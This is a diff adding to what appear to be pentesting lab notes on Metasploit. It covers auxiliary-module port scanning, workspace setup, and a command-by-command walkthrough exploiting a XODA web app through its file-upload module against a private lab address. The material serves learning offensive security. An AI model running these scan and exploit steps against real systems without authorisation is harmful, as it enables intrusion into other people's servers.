@@ -44,3 +44,29 @@ Discover available live hosts and their open ports using Nmap and identify the r
 - Verify that the MSF database is connected: `db_status`
 - Import the the Nmap Scan Results: `db_import nmapscan.xml`
 - Check the results: `hosts` and `services`
+
+### Auxiliary Modules
+An Auxiliary Module is a type of module within a system that includes exploits without payloads and enhances the functionality of the system by performing tasks like remote system scanning and fingerprinting. They are used to perform functionality, discovery and fuzzing. Against NMAP scans, auxiliary modules are more effective in the post-exploitation phase because they allow us to identify whether the server or PC, whose IP we have, is part of an internal network. Additionally, this may enable us to exploit other devices.
+
+**Practical:**
+- First check your IP address: `ifconfig`
+- Make sure the postgreSQL service is started: `service postgresql start`
+- Start msfconsole: `msfconsole`
+- Check Database status: `db_status` If connection type = postgresql everything is allright.
+- Add a Workspace: `workspace -a "examplename"`
+- You can check the current workspace your working in with`workspace` (the res star shows your selected workspace)
+- You can change the current workspace with `workspace "name of the workspace you want"`
+- Search Auxiliary Modules: `search (portscan)`
+- You can select and use a module by: `use (name of the module or number)`
+- `show options`
+- Set the RHOST `set RHOSTS 192.168.20.3`
+- execute the module: `run`
+- downloading the webpage of the IP adress to what we can identify: `curl 192.168.20.3`
+
+**Exploiting XODA-Device (what we just curled)**
+- `search Xoda`
+- `run exploit/unix/webapp/xoda_file_upload`
+- `show options`
+- `set RHOST 192.168.20.3`
+- set Path on the Xoda device to root: `set TARGETURI /`
+- run our exploit: `exploit`
